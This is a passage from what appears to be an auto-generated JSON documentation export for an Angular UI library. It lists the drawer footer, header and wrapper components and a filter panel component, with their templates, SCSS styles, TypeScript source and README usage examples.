width of the already opened drawer.\nDefault 0.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer offset=&quot;32px&quot;&gt;</code></pre></div><h5 id=\"padding\">padding</h5>\n<p>Offset (space) between the viewPanel top and the drawer in pixels.\nBinds to the top style property.\n Default 0.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer padding=&quot;16px&quot;&gt;</code></pre></div><h5 id=\"position\">position</h5>\n<p>Position of the drawer as a string\nLeft or right. Default right.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer position=&quot;left&quot;&gt;</code></pre></div><h5 id=\"cssclass\">cssClass</h5>\n<p>Additional css class(es) as a string e.g &quot;sto-drawer--xmas&quot;.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer cssClass=&quot;sto-drawer--xmas&quot;&gt;</code></pre></div><h5 id=\"closeonclick\">closeOnClick</h5>\n<p>If the drawer should close when clicked outside the drawer.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer [closeOnClick]=&quot;false&quot;&gt;</code></pre></div><h5 id=\"ignoreesckey\">ignoreEscKey</h5>\n<p>Esc key closed by default the drawer, this overrides that behaviour.\nDefault false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer [ignoreEscKey]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"open\">open</h5>\n<p>If the drawer is opened.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer [open]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"width\">width</h5>\n<p>The width of the drawer in as a string (pixels: &#39;600px&#39;, presentage: &#39;33%&#39;, or viewPort:&#39;30vw&#39;)\nDefault &#39;25vw&#39;</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer width=&quot;320px&quot;&gt;</code></pre></div><p>####Output </p>\n<h5 id=\"ontoggle\">onToggle</h5>\n<p>Emits true if opened, false if closed.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (onToggle)=&quot;onToggle($event)&quot;&gt;</code></pre></div><h5 id=\"onclose\">onClose</h5>\n<p>Emits on close.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (onClose)=&quot;onClose()&quot;&gt;</code></pre></div><h5 id=\"onopen\">onOpen</h5>\n<p>Emits on open.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (onOpen)=&quot;onOpen()&quot;&gt;</code></pre></div><h5 id=\"cancel\">cancel</h5>\n<p>Emits on cancel. When the cancel is called by pressing ESC key.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (cancel)=&quot;onCancel()&quot;&gt;</code></pre></div><h5 id=\"submit\">submit</h5>\n<p>Emits on submit. When the submit is called from code like CTRL+S.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (submit)=&quot;onSubmit()&quot;&gt;</code></pre></div>",
      "templateData": "<div\n  [ngClass]=\"position + ' ' + cssClass\"\n  [style.width]=\"width\"\n  [style.top]=\"padding\"\n  [style.zIndex]=\"position === 'left' ? 60 : 58\"\n  [style.right]=\"offset\"\n  [@drawerAnimations]=\"slideInOut\"\n  class=\"sto-drawer\">\n  <div class=\"sto-drawer__header__wrapper\"\n       [style.display]=\"headerChild ? 'inherit' : 'none'\"\n       #header>\n    <ng-content select=\"sto-drawer-header\">\n    </ng-content>\n  </div>\n  <div [class.navigation]=\"!header\"\n       [style.height]=\"height\"\n       class=\"sto-drawer__content\">\n    <ng-content></ng-content>\n  </div>\n\n  <div class=\"sto-drawer__footer\"\n       [style.display]=\"footer ? 'inherit' : 'none'\"\n       #footerEl>\n    <ng-content select=\"sto-drawer-footer\"></ng-content>\n  </div>\n\n</div>\n\n<div @overlay\n     class=\"sto-drawer__overlay\"\n     [style.left]=\"0\"\n     *ngIf=\"open && animation && backdrop\"\n     (click)=\"closeDrawer()\"></div>\n"
    },
    {
      "name": "StoDrawerFooterComponent",
      "id": "component-StoDrawerFooterComponent-22c396e15d6ebc9798aa216980bc09f0ec53d35b79ea0b494012d5481e6368504e67676f8cff5bf9a1f2c9053f408b357c30d948c010faba43b71b61dbca947b",
      "file": "libs/drawer/src/lib/sto-drawer/sto-drawer-footer.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-drawer-footer",
      "styleUrls": [],
      "styles": [],
      "template": "<ng-content></ng-content>",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component } from '@angular/core';\n\n@Component({\n  selector: 'sto-drawer-footer',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDrawerFooterComponent {\n}\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": ""
    },
    {
      "name": "StoDrawerHeaderComponent",
      "id": "component-StoDrawerHeaderComponent-c9bdde89e3a4604fe36da9c15280654b4303662f6e2b804938e856ff6309568b41d7c54ca9c7a3f74ef2cd6bcd1f8d9ee2a2c305eab909e368254e3fc9b8513b",
      "file": "libs/drawer/src/lib/sto-drawer/sto-drawer-header.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-drawer-header",
      "styleUrls": [
        "./sto-drawer.component.scss"
      ],
      "styles": [],
      "template": "<ng-content></ng-content>",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "class",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 10,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-drawer__header'"
            }
          ]
        }
      ],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-drawer__header",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 10,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component, HostBinding } from '@angular/core';\n\n@Component({\n  selector: 'sto-drawer-header',\n  template: `\n    <ng-content></ng-content>`,\n  styleUrls: [ './sto-drawer.component.scss' ]\n})\nexport class StoDrawerHeaderComponent {\n  @HostBinding('class.sto-drawer__header') class = true;\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "@use '@angular/material' as mat;\n\n\n$header-height: 74px;\n$large-header-height: 24 * 4px;\n$footer-height: 16 * 4px;\n$header-size: 20px;\n\n\n.sto-drawer {\n  height: 100vh;\n  display: flex;\n  flex-direction: column;\n  background: var(--bg-card);\n\n  .sto-drawer__header__wrapper {\n    flex: 1 1 $header-height;\n    box-shadow: none;\n  }\n\n  .sto-drawer__content {\n    flex: 1 1 auto;\n    padding-bottom: 0;\n  }\n\n  .drawer-footer {\n    position: sticky;\n    bottom: 0;\n    display: flex;\n    justify-content: flex-end;\n    align-items: center;\n    padding: 16px 8px;\n  }\n\n  &__content {\n    padding-top: 0;\n  }\n\n  padding-top: 0;\n\n  &__footer {\n    flex: 1 1 $footer-height;\n  }\n\n  transition: right 400ms ease-in-out;\n  @include mat.elevation(3);\n  position: fixed;\n  top: 0;\n  width: 20%;\n  min-width: 260px;\n\n  &.right {\n    min-width: 450px;\n  }\n\n  z-index: 30;\n\n  &.right {\n    left: auto;\n    right: 0;\n  }\n\n  &.left {\n    left: 0;\n    right: auto;\n  }\n\n  &__content {\n    padding: 2 * 4px;\n    overflow-y: auto;\n    overflow-x: hidden;\n\n    &.navigation {\n      height: 100%;\n    }\n  }\n\n  &__footer {\n    @include mat.elevation(1);\n    bottom: 0;\n    left: 0;\n    padding: 2 * 4px;\n    width: 100%;\n\n    height: calc(#{$footer-height} - 4 * 4px);\n\n    button {\n      text-transform: uppercase;\n    }\n\n    &__more {\n      float: right;\n    }\n  }\n\n  &__header {\n    display: flex;\n    align-items: center;\n    width: 100%;\n    padding-top: 16px;\n\n    .sto-main-icon {\n      height: 40px;\n      width: 40px;\n      margin: 6px 0 0 16px;\n    }\n\n    &__title {\n      margin: 0;\n      padding-left: 16px;\n    }\n\n    &__suffix {\n      width: 100%;\n      text-align: right;\n      min-width: 56px;\n      //color: $white-87;\n    }\n\n    &__infix {\n      min-width: 56px;\n\n      //color: $white;\n    }\n\n    button.mat-icon-button {\n      margin: 0 8px;\n      border: 0;\n      outline: none;\n      cursor: pointer;\n\n    }\n\n    &__wrapper {\n      @include mat.elevation(4);\n      z-index: 1;\n      padding: 0;\n      display: flex;\n      box-sizing: border-box;\n      width: 100%;\n      height: $header-height;\n      flex-direction: row;\n      align-items: center;\n      white-space: nowrap;\n\n    }\n  }\n}\n\n.large-header {\n  .sto-drawer {\n    padding-top: $large-header-height;\n  }\n}\n\n.sto-navigation{\n  .mat-list {\n    .mat-subheader {\n      padding: 8px;\n    }\n  }\n}\n\n.sto-drawer__overlay {\n  position: fixed;\n  top: 0;\n  height: 100vh;\n  width: 100vw;\n  z-index: 40;\n  opacity: 0.08;\n}\n\n@import \"sto-drawer-tabs.component\";\n\n// Theme\n\n.sto-drawer__overlay {\n  background: var(--bg-overlay);\n}\n\n.sto-drawer {\n  background-color: var(--bg-card);\n\n  &__footer {\n    border-top: 1px solid var(--divider);\n    background-color: var(--bg-card);\n    color: var(--text);\n  }\n\n  &__content {\n    background-color: var(--bg-card);\n    color: var(--text);\n  }\n\n  &__header {\n    &__wrapper {\n      background-color: var(--bg-card);\n      color: var(--text);\n    }\n  }\n\n  // @deprecated TODO remove in angular 14\n  .sto-slide-panel {\n    color: var(--text);\n    background-color: var(--bg-card);\n\n    .mat-list.sto-navigation {\n      .mat-list-item {\n        color: var(--text);\n\n        .mat-icon {\n          color: var(--text);\n        }\n\n        .sto-navigation__item__text {\n          color: var(--text);\n\n          a {\n            color: var(--primary-resting);\n          }\n        }\n      }\n    }\n  }\n}\n",
          "styleUrl": "./sto-drawer.component.scss"
        }
      ],
      "stylesData": ""
    },
    {
      "name": "StoDrawerWrapperComponent",
      "id": "component-StoDrawerWrapperComponent-1f454a834ee56059b77c0934782befcf2c7899b446af3404aa56007dd4ebaaf95deeb645025a37343c448c4921cd3ad182a5055ce4faf7c11c4663a7580dd36d",
      "file": "libs/drawer/src/lib/sto-drawer/sto-drawer-wrapper.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-drawer-wrapper",
      "styleUrls": [
        "./sto-drawer-wrapper.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-drawer-wrapper.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component } from '@angular/core';\n\n@Component({\n  selector: 'sto-drawer-wrapper',\n  templateUrl: './sto-drawer-wrapper.component.html',\n  styleUrls: [ './sto-drawer-wrapper.component.scss' ]\n})\nexport class StoDrawerWrapperComponent {\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ":host {\n  position: relative;\n  transform: translate3d(0,0,0);\n}\ndiv.wrapper {\n  margin: 5px 0px;\n  display: block;\n}\ndiv.content {\n  display: block;\n}",
          "styleUrl": "./sto-drawer-wrapper.component.scss"
        }
      ],
      "stylesData": "",
      "templateData": "<div class=\"wrapper\">\n\t<ng-content select=\"sto-sidebar\"></ng-content>\n\t<div class=\"content\">\n\t\t<ng-content></ng-content>\n\t</div>\n</div>"
    },
    {
      "name": "StoFilterActionsBar",
      "id": "directive-StoFilterActions-b0f9a90b956cb63ef40defdf7ae45c5b5a578a79df0bbb7e3133eff22d4ad449ab714db9d8e7ac0b02040c9a7543eda5a0c526091e497cc853019c112c2b8006",
      "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-filter-actions-bar",
      "styleUrls": [],
      "styles": [],
      "template": "<ng-content></ng-content>\n<button mat-icon-button\n        class=\"toggle-expand-button\"\n        *ngIf=\"expandable\"\n        title=\"Toggle filter panel\"\n        (click)=\"toggle.emit()\">\n  <mat-icon>filter_list</mat-icon>\n</button>\n\n",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "expandable",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 210,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "expanded",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 202,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "toggle",
          "defaultValue": "new EventEmitter<void>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 213,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "_expanded",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 211,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "hasClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 200,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-filter-actions'"
            }
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "onChange",
          "args": [
            {
              "name": "event",
              "type": "",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 216,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-filter-actions",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 200,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n    <ng-content></ng-content>\n    <button mat-icon-button\n            class=\"toggle-expand-button\"\n            *ngIf=\"expandable\"\n            title=\"Toggle filter panel\"\n            (click)=\"toggle.emit()\">\n      <mat-icon>filter_list</mat-icon>\n    </button>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": "",
      "accessors": {
        "expanded": {
          "name": "expanded",
          "setSignature": {
            "name": "expanded",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "expanded",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 202,
            "jsdoctags": [
              {
                "name": "expanded",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "expanded",
            "type": "boolean",
            "returnType": "boolean",
            "line": 206
          }
        }
      },
      "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
    },
    {
      "name": "StoFilterPanelComponent",
      "id": "component-StoFilterPanelComponent-b0f9a90b956cb63ef40defdf7ae45c5b5a578a79df0bbb7e3133eff22d4ad449ab714db9d8e7ac0b02040c9a7543eda5a0c526091e497cc853019c112c2b8006",
      "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-filter-panel",
      "styleUrls": [
        "./sto-filter-panel.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-filter-panel.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "expandable",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIf the filter panel should be expandable. Default true.\n",
          "description": "<p>If the filter panel should be expandable. Default true.</p>\n",
          "line": 40,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "expanded",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIf the filter panel should be expanded by default. Default false.\n",
          "description": "<p>If the filter panel should be expanded by default. Default false.</p>\n",
          "line": 46,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "filterList",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nList of active filters.\n",
          "description": "<p>List of active filters.</p>\n",
          "line": 52,
          "type": "FilterList[]",
          "decorators": []
        },
        {
          "name": "host",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 78,
          "type": "FilterForm<Record<string, >>",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "clearFilter",
          "defaultValue": "new EventEmitter()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits when a filter should be cleared (if applicable)\n",
          "description": "<p>Emits when a filter should be cleared (if applicable)</p>\n",
          "line": 65,
          "type": "EventEmitter"
        },
        {
          "name": "toggled",
          "defaultValue": "new EventEmitter<{ isExpanded: boolean, contentHeight: number }>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content i pixels.\n {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n",
          "description": "<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content i pixels.\n {EventEmitter&lt;{isExpanded: boolean, contentHeight: number }&gt;}</p>\n",
          "line": 60,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "_contentHeight",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 79,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "contentWrapper",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "literal type",
          "optional": false,
          "description": "<p>Buttons and actions on the left side of the separator if both table and filter actions is present.</p>\n",
          "line": 70,
          "rawdescription": "\n\nButtons and actions on the left side of the separator if both table and filter actions is present.\n",
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'tableActions'"
            }
          ]
        },
        {
          "name": "contentWrapper2",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "literal type",
          "optional": false,
          "description": "<p>Buttons and actions on the right side of the separator if both table and filter actions is present.</p>\n",
          "line": 74,
          "rawdescription": "\n\nButtons and actions on the right side of the separator if both table and filter actions is present.\n",
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'filterActions'"
            }
          ]
        },
        {
          "name": "filterForm",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "literal type",
          "optional": false,
          "description": "",
          "line": 75,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'filterForm'"
            }
          ]
        },
        {
          "name": "hasSeperator",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 81,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "_clearFilter",
          "args": [
            {
              "name": "key",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 144,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "key",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "needSeperator",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 125,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ]
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 112,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 100,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "setContentHeight",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 117,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "toggle",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 94,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "<p>Sto filter panel is an extension of mat-accordion</p>\n",
      "rawdescription": "\n\nSto filter panel is an extension of mat-accordion\n",
      "type": "component",
